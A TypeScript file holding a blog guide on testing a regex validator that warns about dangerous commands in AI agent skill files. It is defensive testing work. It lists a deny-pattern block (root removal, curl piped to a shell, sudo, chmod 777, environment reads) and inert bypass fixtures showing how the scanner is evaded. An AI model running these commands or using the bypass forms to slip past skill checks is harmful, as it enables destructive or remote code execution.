import type { BlogPost } from './index';

export const post: BlogPost = {
  title: 'Agent Skill Command Safety Testing',
  description:
    'Agent skill command safety testing covers dangerous command patterns, bypasses, false positives, multiline content, mutation cases, and warning evidence.',
  date: '2026-07-25',
  updated: '2026-07-25',
  category: 'Guide',
  primaryKeyword: 'agent skill command safety testing',
  keywords: [
    'agent skill command safety testing',
    'dangerous command regex test',
    'skill validator false positive',
    'command injection pattern bypass',
    'multiline shell detection',
    'validator mutation testing',
    'agent skill safety warning',
    'static analysis limitation',
  ],
  relatedSlugs: [
    'testing-markdown-xss-react-markdown-rehype-sanitize',
    'testing-skill-md-yaml-frontmatter-roundtrip',
    'skill-md-csv-yaml-array-normalization-tests',
    'malformed-skill-md-frontmatter-parser-tests',
  ],
  sources: [
    'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
    'https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices',
    'https://nodejs.org/api/child_process.html',
  ],
  content: `
Agent skill command safety testing runs each warning pattern against clear matches, safe text, spacing changes, quotes, line breaks, and disguised commands. The suite must reveal missed cases and false alarms without treating a regex hit, or the lack of one, as proof that a skill is safe.

QASkills warns when skill content contains a small set of risky command forms. Review the [agent skill security checklist](/blog/agent-skill-security-review-checklist), then use the [Playwright CLI skill](/skills/Pramod/playwright-cli) as a realistic safe control with many command examples and browser steps.

## How Do You Build a Dangerous Command Regex Test?

A dangerous command regex test needs three groups: text that must match, text that must not match, and text that reveals a known gap. This split stops maintainers from calling every miss a bug or every hit a real attack.

The validator checks nine case-sensitive patterns in the Markdown body. It warns about a root removal form, a downloaded script piped to a shell, direct eval or exec calls, child process access, environment reads, direct file-system imports, sudo, and world-writable modes.

\`\`\`typescript
const DANGEROUS_PATTERNS = [
  /rm\\s+-rf\\s+\\//,
  /curl\\s+.*\\|\\s*sh/,
  /eval\\s*\\(/,
  /exec\\s*\\(/,
  /child_process/,
  /process\\.env\\.\\w+/,
  /require\\(['"]fs['"]\\)/,
  /sudo\\s+/,
  /chmod\\s+777/,
];
\`\`\`

These patterns are warning rules, not a shell parser. They do not know whether text is prose, a fenced code sample, a quoted string, or a command an agent will run. They also do not model aliases, variables, other tools, or every shell.

The [OWASP command injection defense guide](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) recommends avoiding shell calls where possible and separating commands from arguments. Use that rule to shape review, but test the local patterns exactly as written.

| Corpus group | Purpose | Expected validator result | Reviewer action |
| --- | --- | --- | --- |
| Clear match | Prove each pattern can fire | Safety warning exists | Inspect intent and scope |
| Safe control | Find broad or vague matches | No warning expected | Fix false alarm if needed |
| Known bypass | Record what regex misses | No warning with gap label | Add other controls or repair |
| Mixed document | Check prose and code context | Result follows current policy | Human review decides risk |
| Mutated pattern | Prove the suite detects drift | One case fails | Restore or approve the rule |

Use one row per pattern and give it a short reason. A failed test should say "sudo with tab missed" instead of showing one large document. Small rows help reviewers see whether the rule or the expected policy changed.

The [skill validation CI guide](/blog/validate-skill-md-in-ci-pipeline) explains where validator tests run. Keep this corpus close to the validator so a regex edit and its evidence change in one review.

Agent skill command safety testing should call validateSkillContent through public input. Direct regex tests can add detail, but the main case must prove the warning reaches the returned result.

## What Is a Skill Validator False Positive?

A skill validator false positive is safe or quoted text that matches a warning rule even though the document does not ask an agent to run that action. Examples include a security lesson, a negated command, an API name, or text inside a code review checklist.

False positives matter because noisy tools train users to ignore warnings, and they can block useful security docs if teams treat each match as an error. Record safe context without removing a rule that still catches likely harm.

The current validator scans the whole parsed Markdown body. It does not skip code fences, inline code, quoted samples, comments, or "do not run" text. That behavior is simple, but a test should make its cost visible.

\`\`\`typescript
const safeControls = [
  {
    name: 'negated root removal lesson',
    body: 'Never run the root removal command shown in this security lesson.',
    expectedWarnings: 0,
  },
  {
    name: 'child process API review',
    body: 'Review Node process APIs before granting a tool permission.',
    expectedWarnings: 0,
  },
  {
    name: 'ordinary file permission',
    body: 'Use a least-privilege file mode selected by the repository owner.',
    expectedWarnings: 0,
  },
];
\`\`\`

Keep safe controls semantically close to risky text without embedding an active command. This lets the test measure rule precision while the fixture remains inert. A separate controlled fixture can hold exact match strings as data.

Do not solve noise by suppressing every code fence because skills often place real commands in fenced blocks, so that change could hide the main risk. Instead, attach context to warnings, show the matched rule, and ask a reviewer to judge intent.

The [guide to writing high-quality QA skills](/blog/how-to-write-high-quality-qa-skills) can supply normal instructions for negative controls. Use setup, test, and report steps that should not trigger any safety warning.

Create a false-positive budget only for triage, not safety. Measure the rate across reviewed fixtures, then improve rule wording or context. Never tune solely against the current seed catalog because new attack forms may differ.

Agent skill command safety testing should preserve useful warnings even when some safe text matches. The output must say "potentially dangerous pattern," not "malicious skill," because the regex does not prove intent.

## How Do You Find a Command Injection Pattern Bypass?

A command injection pattern bypass changes spelling, case, spacing, quoting, line layout, shell syntax, interpreter, or data flow while keeping a risky effect. Tests should record these misses as limits and decide whether regex, parsing, or runtime policy should address them.

The current expressions are case-sensitive and narrow. One uses a dot that does not span line breaks. Several expect one exact API spelling. Attackers and normal scripts can express the same action through many other forms.

Build bypass rows as inert strings. Do not execute them. Assert only whether the validator warns, then label the desired policy and owner.

\`\`\`typescript
import { expect, it } from 'vitest';
import { validateSkillContent } from './index';

const bodyFor = (sample: string) => [
  'Read this inert test fixture.',
  'The next line is data for a validator test.',
  sample,
  'Do not execute fixture content.',
].join('\\n');

it.each([
  ['upper-case shell token', 'CURL example.test | SH'],
  ['line break before pipe', 'curl example.test\\n| sh'],
  ['different shell', 'curl example.test | bash'],
  ['indirect process import', 'import("node:" + "child_process")'],
])('records a command injection pattern bypass: %s', (_name, sample) => {
  const result = validateSkillContent(validSkill(bodyFor(sample)));

  expect(result.warnings.filter((warning) => warning.field === 'safety')).toEqual([]);
});
\`\`\`

Those expectations document current misses. A security requirement may instead expect selected rows to warn. In that case, mark the desired assertion as failing, improve the detector, and keep the row as a regression test.

Avoid publishing a large bypass cookbook in end-user text or error output, while tests use small inert variants that prove case, line-break, indirection, and alternate-tool classes. Keep detailed threat cases in a controlled security test folder.

The [MCP security best practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices) stress consent, scope, and tool safety around agent actions. Those controls matter because static text matching cannot see what a tool will do after install.

Use layers:

- Validate skill source, schema, and known warning patterns before publication.
- Show the author, source, version, permissions, and changed files before install.
- Ask for clear user consent before a high-impact tool call.
- Restrict file, network, process, and secret access at runtime.
- Log the chosen action without storing secrets or full sensitive payloads.
- Review warnings and known misses with a human for high-risk skills.

Agent skill command safety testing should not promise complete bypass coverage. Its job is to make known limits executable and stop silent regression in the warning layer.

## Test Multiline Shell Detection

Multiline shell detection checks whether a pattern sees commands split by a backslash, newline, pipe on another line, YAML block, Markdown list, or code fence. Shell scripts often span lines for clarity, so line behavior is not only an attack concern.

JavaScript regex dot does not match a newline without the \`s\` flag. The current download-and-pipe pattern uses \`.*\`, so a line break can stop that match. Whitespace classes elsewhere may cross lines and create different results.

Create a matrix for spaces, tabs, carriage returns, Unix newlines, Windows line endings, and escaped line continuation. Keep every sample as text in memory. No child process should start.

For each row, assert three facts:

- Whether the current validator returns a safety warning.
- Whether product policy wants a warning for that form.
- Which later control limits harm if static matching misses it.

This makes disagreement visible. A current-result test protects behavior, while a desired-policy test can stay red during a planned fix only on an isolated branch. Do not merge knowingly failing tests into the release branch.

The [SKILL.md format guide](/blog/skill-md-format-guide) includes code blocks and lists that can split text. Run multiline rows inside plain paragraphs, fenced blocks, and list items because the validator scans the parsed body as one string.

Add safe multiline controls too. Prose may place "curl" at one line end and discuss a shell on the next line without forming a command. A broad cross-line expression can create new false alarms.

Agent skill command safety testing should state whether code fences receive special treatment. The current implementation does not parse Markdown nodes before matching. If the team moves to syntax-aware analysis, retain text-level compatibility cases and add node-context tests.

Do not join all whitespace before scanning without tests. That may catch split commands, but it can also create tokens that never existed together. Normalize one rule at a time and review both match and safe-control tables.

## Add Validator Mutation Testing

Validator mutation testing changes one pattern or warning path in a controlled test build and proves the corpus fails. This checks whether assertions can detect a missing rule, weaker spacing, changed case behavior, or warning field drift.

You can start without a mutation framework. Extract pattern evaluation into a function that accepts a pattern set, then pass one set with a rule removed. At least one clear-match row should fail.

\`\`\`typescript
function findSafetyWarnings(content: string, patterns: RegExp[]) {
  return patterns
    .filter((pattern) => pattern.test(content))
    .map((pattern) => ({
      field: 'safety',
      message: \`Potentially dangerous pattern found: \${pattern.source}\`,
    }));
}

it('kills a mutation that removes the process API rule', () => {
  const mutated = DANGEROUS_PATTERNS.filter(
    (pattern) => pattern.source !== 'child_process',
  );
  const body = 'This inert fixture names child_process for the detector.';

  expect(findSafetyWarnings(body, mutated)).toEqual(
    expect.arrayContaining([
      expect.objectContaining({ field: 'safety' }),
    ]),
  );
});
\`\`\`

That example is meant to fail under the mutated set. A mutation runner inverts the pass result automatically. If you hand-roll the check, compare original and changed sets so the normal suite remains green.

Useful mutations include deleting a rule, removing whitespace handling, adding an unsafe case-insensitive flag without safe controls, changing warning to error, stopping after the first match, and scanning raw frontmatter instead of body. Choose one mutation from each class and give it a stable name, since reviewers need to know which test would catch that exact form of drift.

Mutation score is not a security score because it tells you only whether tests notice selected code changes. It does not show that the rule set covers every harmful command or that runtime permissions are sound.

The [agent skill security checklist](/blog/agent-skill-security-review-checklist) can guide mutation choices based on real controls. Focus on changes a maintainer might make during cleanup, not endless random regex edits.

Keep deterministic mutations small because regex engines can have costly paths, so add length and timing tests for patterns that accept broad repetition. Static analysis should not let one large skill stall validation.

Agent skill command safety testing gains trust when each warning rule has a clear match, a close safe control, a known miss, and a mutation that the suite catches. That four-part record also gives a reviewer enough proof to approve, reject, or narrow a later rule change without guessing at its former goal.

## Verify an Agent Skill Safety Warning

An agent skill safety warning should identify the safety field, name the matched pattern class, remain a warning rather than a verdict, and preserve other validation results. Tests should also cover several matches and repeated validation.

The current validator adds one warning for every matching pattern and does not stop after the first. A document that matches two rules should return two safety warnings along with any content-length warning.

Use exact warning counts only when the fixture has one deliberate match, while mixed documents compare pattern sources as a set because order follows the internal array and may change during rule grouping. This split keeps small failures clear without binding broad tests to a private rule order.

Assert that a warning does not set \`valid\` to false when schema fields are valid. That is current behavior. If policy later blocks publication for selected classes, add severity levels rather than changing every warning without notice.

The [QA skills directory](/skills) can show warnings during review, but public labels must avoid unsupported claims. "Potential command risk" is fair. "Verified malware" is not supported by regex evidence.

Never include matched secrets in a warning. The environment rule can detect a variable name, and future patterns may touch token-like text. Return a safe rule ID and source line range instead of the full line when content can be sensitive.

Agent skill command safety testing should run the same input twice. RegExp objects without global state behave the same on repeated calls, but a future \`g\` flag can change \`lastIndex\` and cause alternating results. A repeated-call case catches that subtle drift.

Test an empty body and a long safe body. The first checks no accidental warning, while the second checks basic speed and avoids a detector that matches common words.

## Document Each Static Analysis Limitation

Each static analysis limitation should appear beside the test that proves it. A short registry can name the missed class, current result, other control, review owner, and plan. This turns vague caveats into work that can be tracked.

Key limits in the current scanner include:

- It uses regular expressions rather than a shell, JavaScript, or Markdown syntax tree.
- It is case-sensitive and expects selected spellings.
- It does not trace variables, aliases, string joins, imports, or generated commands.
- It does not know whether a sample is quoted, negated, fenced, or meant to run.
- It checks only the Markdown body after parsing, not linked files or fetched content.
- It warns on text but does not inspect runtime tool permissions.
- It can miss alternate programs that produce the same high-impact effect.
- It can flag safe lessons that mention the exact risky form.

Do not hide limits in a general disclaimer. Map each one to a unit row or integration case. The document then stays true when the scanner changes.

The [Node child process documentation](https://nodejs.org/api/child_process.html) distinguishes direct execution from shell-based execution and lists several APIs. A single \`child_process\` text rule cannot judge how those APIs are called, which is why source and permission review remain necessary.

Add linked-file tests if skill packages may include scripts and references. The current validateSkillContent path receives one SKILL.md string, so it cannot see a command stored in a companion script. Package-level validation needs an explicit file walk and file-type policy.

The [Agent Skills portability guide](/blog/agent-skills-open-standard-portability) explains companion files across clients. A portable package can increase the review surface, so list every file installed and hash it before use.

Agent skill command safety testing should use plain language in reports: "No configured pattern matched" is accurate. "No dangerous command exists" is not.

Give each pattern a named owner, plain risk note, added date, safe control, and linked test case. This small rule record helps reviewers decide whether a proposed edit fixes a known miss or merely makes the expression harder to read.

Pin the threat model to skill install and use paths, since a command shown in docs has different reach from one sent to a tool with broad process rights. The scanner can share rules across paths, but the final risk label should use source, action, data, and granted access.

Scan package scripts and reference files under a strict size and file-type limit when policy says those files can guide agent work. Report files that were skipped, because an incomplete scan must not look like full package proof.

Add one no-execution install test that copies a marked fixture into a temp folder, shows the warning, and stops before any command path can start. This links static results to the user flow while keeping the test safe on local and shared CI hosts.

Store release evidence as rule version, package hash, matched rule IDs, known skipped files, reviewer, and final policy result. Keep that record small and do not save full command text when it may include a secret or private host.

## Run the Safety Procedure

Run the safety procedure whenever warning patterns, Markdown parsing, package files, install paths, permissions, or execution tools change. Keep samples inert and bind every result to the exact commit.

1. List each configured pattern with one clear match and one close safe control.
2. Add spacing, quote, case, multiline, and indirection variants as known-gap rows.
3. Wrap every sample in a valid SKILL.md and call validateSkillContent.
4. Assert warning field, safe rule text, count, validity, and repeated-call behavior.
5. Run selected mutations and prove at least one focused test catches each change.
6. Scan every file type that package policy includes, without executing any content.
7. Review runtime file, network, process, and secret permissions as separate controls.
8. Record false alarms, known misses, owners, and repair choices in a small registry.
9. Block only according to a written severity policy, not raw regex count.

Use unit tests for the broad string table. Add one install-flow test that shows warnings before files are trusted or commands can run. The flow should use a temporary folder and no real network.

Run the [Playwright CLI skill](/skills/Pramod/playwright-cli) as a safe integration control because it contains many normal commands. Review any warning instead of adding a blanket exception for a featured skill.

Store exact risky match strings in controlled test fixtures where code owners can review changes. Keep public failure output limited to rule IDs, file paths, and safe locations.

Agent skill command safety testing should fail when a promised rule stops warning or a safe control starts warning without review. Known misses stay visible until another layer or detector change addresses them.

## Combine Static and Human Review Before Install

Static checks are quick and consistent, so they are useful for triage, while human review can read intent, linked files, requested permissions, data flow, and source ownership. Runtime limits can stop actions that both reviews miss.

Use all three layers. A regex warning should open a review, not issue a final verdict. No warning should still lead to source, file, permission, and provenance checks for a high-impact skill.

Publish the rule version with results. When patterns change, reviewers can rerun old packages and compare warning differences. Keep repaired bypass cases in the suite so the same gap does not return.

Browse [QA skills](/skills), read the [security testing guide](/blog/security-testing-ai-generated-code), and run the corpus against the real validator before installing a new package. Pair each warning with a named reviewer and a least-privilege runtime rule.

## Frequently Asked Questions

### Does a regex warning prove a skill is malicious?

No. It proves only that selected text matched one configured expression. The text may be a real command, a safe lesson, a quoted example, or unrelated prose. Review intent, source, companion files, permissions, and runtime behavior before making an install or publication decision.

### Does no warning prove a skill is safe?

No. Regex rules miss alternate tools, case changes, split lines, variables, linked scripts, generated commands, and harmful instructions without listed words. Report that no configured pattern matched, then apply provenance checks, human review, consent, sandboxing, and least-privilege access for sensitive actions.

### Should code fences be ignored during scanning?

Not by default. Skills often place commands in code fences because agents and users may copy or run them. Ignoring every fence can hide real risk. Track Markdown context, show it to reviewers, and use safe controls to reduce noise without removing the whole command surface.

### How do mutation tests help a regex scanner?

Mutation tests prove the suite notices selected changes such as a deleted rule, weaker spacing, wrong severity, or early loop exit. They measure test sensitivity to those edits. They do not measure complete attack coverage, parser correctness, runtime isolation, or the safety of installed content.

### What should a safety warning contain?

Include a stable rule ID, file path, safe line range, severity or review class, and a short next step. Avoid full matched text when it may contain secrets. Use wording such as "potential risk" and never claim that a regex alone verified malicious intent.

### When should a warning block publication?

Block only when a written policy maps that warning class and context to a release error, or when required human review is missing. Keep warnings and errors separate in the result. High-impact commands should also require provenance, permission review, and controlled runtime behavior.
`,
};
